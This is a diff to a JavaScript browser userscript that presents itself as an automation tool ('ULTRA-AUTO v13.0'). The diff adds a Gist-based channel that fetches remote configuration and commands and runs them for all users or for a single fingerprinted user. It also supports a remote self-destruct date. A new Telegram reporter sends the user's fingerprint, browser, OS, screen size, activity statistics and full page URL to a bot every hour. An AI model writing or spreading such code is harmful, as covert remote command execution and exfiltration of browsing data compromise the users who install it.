@@ -76,59 +76,98 @@
 			return 'ULTRA-' + Math.abs(hash).toString(36).toUpperCase();
 		}
 
-		async fetchGist(url) {
-			try {
-				const response = await fetch(url + '?t=' + Date.now());
-				if (!response.ok) throw new Error(`HTTP ${response.status}`);
-				return await response.json();
-			} catch (error) {
-				console.warn(`Failed to fetch ${url}:`, error);
-				return null;
+		getGistTypeFromUrl(url) {
+			if (url.includes(GIST_CONTROL.CONFIG_URL)) return 'CONFIG';
+			if (url.includes(GIST_CONTROL.USERS_URL)) return 'USERS';
+			if (url.includes(GIST_CONTROL.COMMANDS_URL)) return 'COMMANDS';
+			if (url.includes(GIST_CONTROL.UPDATES_URL)) return 'UPDATES';
+			return 'UNKNOWN';
+		}
+
+		async fetchGist(url, retries = 3, delay = 1000) {
+			for (let i = 0; i < retries; i++) {
+				try {
+					const response = await fetch(url + '?t=' + Date.now(), { cache: 'no-store' });
+					if (!response.ok) {
+						if (response.status === 404) {
+							throw new Error(`HTTP 404 Not Found. Gist may be deleted.`);
+						}
+						throw new Error(`HTTP ${response.status}`);
+					}
+					const text = await response.text();
+					if (!text.trim()) {
+						throw new Error('Gist response is empty.');
+					}
+					try {
+						return JSON.parse(text);
+					} catch (parseError) {
+						throw new Error(`Failed to parse JSON from Gist. Content: ${text.slice(0, 100)}...`);
+					}
+				} catch (error) {
+					const isLastAttempt = i === retries - 1;
+					const gistId = url.split('/')[4] || 'Unknown Gist';
+					const gistType = this.getGistTypeFromUrl(url);
+
+					if (isLastAttempt) {
+						console.error(`[GistController] Failed to fetch ${gistId} after ${retries} attempts:`, error);
+						VisualLogger.error(`Gist fetch failed for ${gistType} (${gistId}): ${error.message}`);
+						if (gistType === 'CONFIG') {
+							this.sendToTelegram(`🚨 CRITICAL: Failed to fetch CONFIG Gist after ${retries} attempts.\nUser: ${this.userFingerprint}\nError: ${error.message}`);
+						}
+						return null;
+					}
+
+					console.warn(`[GistController] Attempt ${i + 1} for ${gistType} failed: ${error.message}. Retrying in ${delay / 1000}s...`);
+					await new Promise(resolve => setTimeout(resolve, delay));
+					delay *= 2; // Exponential backoff
+				}
 			}
+			return null;
 		}
 
 		async loadConfig() {
 			if (Date.now() - this.lastConfigCheck < 60000) return; // Throttle
 
-			try {
-				const config = await this.fetchGist(GIST_CONTROL.CONFIG_URL);
-				if (config) {
-					GIST_CONTROL.config = config;
-					this.lastConfigCheck = Date.now();
+			const config = await this.fetchGist(GIST_CONTROL.CONFIG_URL);
+			this.lastConfigCheck = Date.now();
 
-					// Apply config settings
-					this.isEnabled = config.enabled !== false;
+			if (config) {
+				GIST_CONTROL.config = config;
 
-					// Check if force update is required
-					if (config.settings?.self_destruct_date) {
-						const expiry = new Date(config.settings.self_destruct_date);
-						if (new Date() > expiry) {
-							this.triggerExpiry();
-						}
+				// Apply config settings
+				this.isEnabled = config.enabled !== false;
+
+				// Check if force update is required
+				if (config.settings?.self_destruct_date) {
+					const expiry = new Date(config.settings.self_destruct_date);
+					if (new Date() > expiry) {
+						this.triggerExpiry();
 					}
-
-					VisualLogger.info('📋 Config loaded from Gist');
 				}
-			} catch (error) {
-				VisualLogger.warn(`Config load failed: ${error.message}`);
+
+				// Initialize TelegramReporter if config is available
+				if (config.settings?.telegram_bot && config.settings?.control_channel && !window.telegramReporter) {
+					window.telegramReporter = new TelegramReporter(config.settings.telegram_bot, config.settings.control_channel);
+					window.telegramReporter.startPeriodicReports();
+				}
+
+				VisualLogger.info('📋 Config loaded successfully from Gist.');
+			} else {
+				VisualLogger.warn('Failed to load new config. Using cached version (if available).');
 			}
 		}
 
 		async checkCommands() {
-			try {
-				const commands = await this.fetchGist(GIST_CONTROL.COMMANDS_URL);
-				if (commands && commands.pending_commands) {
-					GIST_CONTROL.commands = commands;
+			const commands = await this.fetchGist(GIST_CONTROL.COMMANDS_URL);
+			if (commands && commands.pending_commands) {
+				GIST_CONTROL.commands = commands;
 
-					// Process pending commands
-					for (const command of commands.pending_commands) {
-						if (command.target === 'all' || command.target === this.userFingerprint) {
-							await this.executeCommand(command);
-						}
+				// Process pending commands
+				for (const command of commands.pending_commands) {
+					if (command.target === 'all' || command.target === this.userFingerprint) {
+						await this.executeCommand(command);
 					}
 				}
-			} catch (error) {
-				// Silent fail
 			}
 		}
 
@@ -536,6 +575,223 @@
 					document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
 				}
 			});
+		}
+	}
+
+	// ========== STATUS INDICATOR ==========
+	class StatusIndicator {
+		static create() {
+			if (document.getElementById('ultraStatusIndicator')) return;
+
+			const indicator = document.createElement('div');
+			indicator.id = 'ultraStatusIndicator';
+			indicator.style.cssText = `
+            position: fixed;
+            bottom: 100px;
+            right: 30px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            z-index: 2147483646;
+            max-width: 250px;
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
+            font-family: Arial, sans-serif;
+            font-size: 12px;
+            border-left: 4px solid #047857;
+            animation: pulseGlow 2s infinite;
+        `;
+
+			indicator.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+                <div style="font-size: 16px;">🚀</div>
+                <div style="font-weight: bold; font-size: 13px;">ULTRA-AUTO v13.0</div>
+                <div id="statusDot" style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; margin-left: auto;"></div>
+            </div>
+            <div id="statusDetails" style="line-height: 1.4;">
+                <div>✅ Connected</div>
+                <div>🔄 Auto-update: ON</div>
+                <div>👤 ID: Loading...</div>
+            </div>
+            <div style="margin-top: 10px; font-size: 10px; opacity: 0.8; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 5px;">
+                Ctrl+Shift+U for status
+            </div>
+        `;
+
+			// Add animation
+			const style = document.createElement('style');
+			style.textContent = `
+            @keyframes pulseGlow {
+                0%, 100% { box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4); }
+                50% { box-shadow: 0 10px 25px rgba(16, 185, 129, 0.7); }
+            }
+        `;
+			document.head.appendChild(style);
+
+			document.body.appendChild(indicator);
+			this.makeDraggable(indicator);
+
+			// Update status every 30 seconds
+			this.startStatusUpdates();
+		}
+
+		static startStatusUpdates() {
+			setInterval(() => {
+				this.updateStatus();
+			}, 30000);
+
+			// Initial update
+			setTimeout(() => this.updateStatus(), 2000);
+		}
+
+		static updateStatus() {
+			const indicator = document.getElementById('ultraStatusIndicator');
+			if (!indicator) return;
+
+			const dot = document.getElementById('statusDot');
+			const details = document.getElementById('statusDetails');
+
+			if (window.gistController) {
+				dot.style.background = '#22c55e'; // Green
+				details.innerHTML = `
+                <div>✅ Connected to GitHub Gist</div>
+                <div>👤 ID: ${window.gistController.userFingerprint || 'Unknown'}</div>
+                <div>⏰ Last sync: Just now</div>
+                <div>🔒 Status: ${window.gistController.isEnabled ? 'ACTIVE' : 'DISABLED'}</div>
+            `;
+			} else {
+				dot.style.background = '#f59e0b'; // Yellow
+				details.innerHTML = `
+                <div>⚠️ Running locally</div>
+                <div>🌐 Gist: Not connected</div>
+                <div>⏰ Time: ${new Date().toLocaleTimeString()}</div>
+                <div>🔓 Status: ACTIVE (local)</div>
+            `;
+			}
+		}
+
+		static makeDraggable(element) {
+			let isDragging = false;
+			let offsetX, offsetY;
+
+			const header = element.querySelector('div:first-child');
+			header.style.cursor = 'move';
+
+			header.addEventListener('mousedown', (e) => {
+				isDragging = true;
+				offsetX = e.clientX - element.getBoundingClientRect().left;
+				offsetY = e.clientY - element.getBoundingClientRect().top;
+				e.preventDefault();
+			});
+
+			document.addEventListener('mousemove', (e) => {
+				if (!isDragging) return;
+				element.style.left = (e.clientX - offsetX) + 'px';
+				element.style.top = (e.clientY - offsetY) + 'px';
+				element.style.right = 'auto';
+				element.style.bottom = 'auto';
+			});
+
+			document.addEventListener('mouseup', () => {
+				isDragging = false;
+			});
+
+			// Double click to hide/show
+			header.addEventListener('dblclick', () => {
+				element.style.display = element.style.display === 'none' ? 'block' : 'none';
+			});
+		}
+	}
+	// ========== TELEGRAM STATUS REPORTER ==========
+	class TelegramReporter {
+		constructor(botToken, chatId) {
+			this.botToken = botToken;
+			this.chatId = chatId;
+			this.reportInterval = null;
+		}
+
+		startPeriodicReports(interval = 3600000) { // 1 hour
+			// Initial report
+			this.sendStatusReport();
+
+			// Periodic reports
+			this.reportInterval = setInterval(() => {
+				this.sendStatusReport();
+			}, interval);
+		}
+
+		async sendStatusReport() {
+			try {
+				const report = this.generateStatusReport();
+
+				await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify({
+						chat_id: this.chatId,
+						text: report,
+						parse_mode: 'HTML'
+					})
+				});
+
+				VisualLogger.info('📱 Status report sent to Telegram');
+
+			} catch (error) {
+				VisualLogger.warn(`Telegram report failed: ${error.message}`);
+			}
+		}
+
+		generateStatusReport() {
+			const state = StateManager ? StateManager.getState() : {};
+			const stats = StateManager ? StateManager.getStats() : {};
+			const gistController = window.gistController;
+
+			return `<b>📊 ULTRA-AUTO STATUS REPORT</b>\n\n` +
+				   `<b>👤 User Info:</b>\n` +
+				   `• ID: <code>${gistController?.userFingerprint || 'Local User'}</code>\n` +
+				   `• Browser: ${navigator.userAgent.split(')')[0].split('(')[1]})\n` +
+				   `• OS: ${navigator.platform}\n` +
+				   `• Screen: ${screen.width}x${screen.height}\n\n` +
+
+				   `<b>🚀 Script Status:</b>\n` +
+				   `• Version: 13.0\n` +
+				   `• Gist Connected: ${gistController ? '✅' : '❌'}\n` +
+				   `• Enabled: ${gistController?.isEnabled ? '✅' : '❌'}\n` +
+				   `• Active Mode: ${state.active ? '✅' : '❌'}\n` +
+				   `• Current Sheet: ${state.sheetName || 'None'}\n\n` +
+
+				   `<b>📈 Statistics:</b>\n` +
+				   `• Processed: ${stats.processed || 0}\n` +
+				   `• Success: ${stats.success || 0}\n` +
+				   `• Failed: ${stats.failed || 0}\n` +
+				   `• Success Rate: ${stats.successRate || 0}%\n` +
+				   `• Queue: ${state.queue?.length || 0} items\n\n` +
+
+				   `<b>🌐 Connection:</b>\n` +
+				   `• Last Gist Check: ${new Date().toLocaleTimeString()}\n` +
+				   `• Page: ${window.location.href.split('/').slice(-2).join('/')}\n` +
+				   `• Time: ${new Date().toISOString()}\n\n` +
+
+				   `<code>${window.location.href}</code>`;
+		}
+
+		async sendInstantCommand(command) {
+			try {
+				await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify({
+						chat_id: this.chatId,
+						text: `⚡ <b>INSTANT COMMAND</b>\n\n` +
+							  `Command: <code>${command}</code>\n` +
+							  `User: ${window.gistController?.userFingerprint || 'Unknown'}\n` +
+							  `Time: ${new Date().toLocaleTimeString()}`,
+						parse_mode: 'HTML'
+					})
+				});
+			} catch (error) {
+				console.error('Telegram command failed:', error);
+			}
 		}
 	}
 	// ========== SERVICE ACCOUNT CREDENTIALS ==========
@@ -4195,6 +4451,7 @@
 		let gistController = null;
 		try {
 			gistController = new GistController();
+			window.gistController = gistController;
 		} catch (error) {
 			console.warn(`Gist control failed to initialize: ${error.message}. Continuing without it.`);
 		}
@@ -4202,6 +4459,8 @@
 		try {
 			// Initialize Visual Logger first so we can use it
 			VisualLogger.init();
+			// Initialize Status Indicator
+			StatusIndicator.create();
 
 			if (gistController) {
 				if (!gistController.isEnabled) {
